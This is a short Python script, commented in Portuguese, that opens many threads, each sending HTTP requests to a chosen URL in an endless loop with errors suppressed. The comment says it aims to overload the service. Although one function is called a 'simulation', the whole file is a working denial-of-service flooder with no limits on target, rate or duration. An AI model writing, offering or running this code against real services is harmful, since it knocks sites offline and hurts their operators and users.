import threading
import requests

def ddos_thread(url):
    while True:
        try:
            # Tenta sobrecarregar o serviço com requisições rápidas
            requests.get(url, timeout=1)
        except:
            pass

def start_simulation(url, threads_count):
    for i in range(threads_count):
        t = threading.Thread(target=ddos_thread, args=(url,))
        t.start()
